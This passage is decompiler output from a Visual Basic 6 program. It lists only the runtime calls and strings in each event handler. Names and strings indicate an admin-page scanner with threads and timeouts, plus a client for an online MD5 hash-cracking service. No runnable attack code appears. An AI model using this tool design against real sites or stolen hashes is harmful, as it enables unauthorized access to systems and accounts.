'N  * ref: IsNumeric(
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
End Sub
 
Sub txtStartColCount_LostFocus()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaFpR8
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaFpR8
'N  * ref: IsNumeric(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: "Invalid input! Start column count can be between 1 to 2000"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
End Sub
 
Sub txtTarget_KeyDown(KeyCode As Integer, Shift As Integer)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
End Sub
 
Sub txtThreads_KeyPress(KeyAscii As Integer)
'N  * ref: __vbaExceptHandler
'N  * ref: Chr(
'N  * ref: IsNumeric(
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
End Sub
 
Sub txtTimeOut_KeyPress(KeyAscii As Integer)
'N  * ref: __vbaExceptHandler
'N  * ref: Chr(
'N  * ref: IsNumeric(
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
End Sub
 
Sub Win_Close()
'N  * ref: __vbaExceptHandler
'N  * ref: Time
'N  * ref: __vbaVarSub
'N  * ref: __vbaR4Var
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
End Sub
 
Sub Win_DataArrival(ByVal bytesTotal As Long)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeStr
End Sub
 
Sub Win_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCopy
'N  * ref: "Error ("
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: "): "
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
End Sub
 
Sub Win_SendComplete()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCopy
'N  * ref: Timer
End Sub
 
'Sub GivemyAdminPage()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: "Current Page ("
'N  * ref: __vbaStrI4
'N  * ref: __vbaStrCat
'N  * ref: "/"
'N  * ref: __vbaStrI4
'N  * ref: "): "
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaErrorOverflow
'End Sub
 
Sub winAdmin_Connect(Index as Integer)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaUI1I2
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: Timer
'N  * ref: __vbaFpI4
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStr
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaStrCopy
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaStrCopy
'N  * ref: Subr_138
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
End Sub
 
Sub winAdmin_DataArrival(Index as Integer, ByVal bytesTotal As Long)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStr
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: "HTTP/1."
'N  * ref: __vbaInStr
'N  * ref: __vbaVarMove
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaI4Var
'N  * ref: vbCrLf
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarMove
'N  * ref: __vbaAryLock
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaAryUnlock
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: " "
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarSub
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaUI1I2
'N  * ref: __vbaUI1I2
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaStrCopy
'N  * ref: "Page Found: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Preparing..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaAryLock
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaI4Var
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrVarCopy
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaUI1I2
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaUI1I2
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: Timer
'N  * ref: __vbaFpI4
'N  * ref: __vbaExitProc
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaErrorOverflow
End Sub
 
Sub winAdmin_Error(Index as Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCopy
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaFpR8
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaUI1I2
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: Timer
'N  * ref: __vbaFpI4
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaUI1I2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaUI1I2
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeStr
'N  * ref: __vbaErrorOverflow
End Sub
 
Sub winMD5_Close(Index as Integer)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCmp
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaAryLock
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: LCase(
'N  * ref: __vbaAryUnlock
'N  * ref: "*302 found*"
'N  * ref: __vbaVarLikeVar
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "Cookie: "
'N  * ref: "Set-Cookie"
'N  * ref: __vbaVarDup
'N  * ref: __vbaAryLock
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: Subr_152
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaStrCopy
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaAryLock
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: Subr_135
'N  * ref: __vbaStrMove
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaAryLock
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaInStr
'N  * ref: __vbaLenBstr
'N  * ref: Right(
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaAryLock
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: Subr_140
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstEq
'N  * ref: "Failed"
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrVarCopy
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStr
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaStrCopy
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
End Sub
 
Sub winMD5_Connect(Index as Integer)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: "Cookie: *"
'N  * ref: __vbaStrLike
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrCopy
'N  * ref: "http://md5hashcracker.appspot.com/status"
'N  * ref: Subr_138
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "Requesting"
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaAryLock
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaAryLock
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaAryLock
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: Subr_138
'N  * ref: __vbaStrMove
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "1"
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
End Sub
 
Sub winMD5_DataArrival(Index as Integer, ByVal bytesTotal As Long)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStr
'N  * ref: "2"
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeStr
End Sub
 
Sub winMD5_Error(Index as Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCopy
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: "Error!"
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeStr
End Sub
 
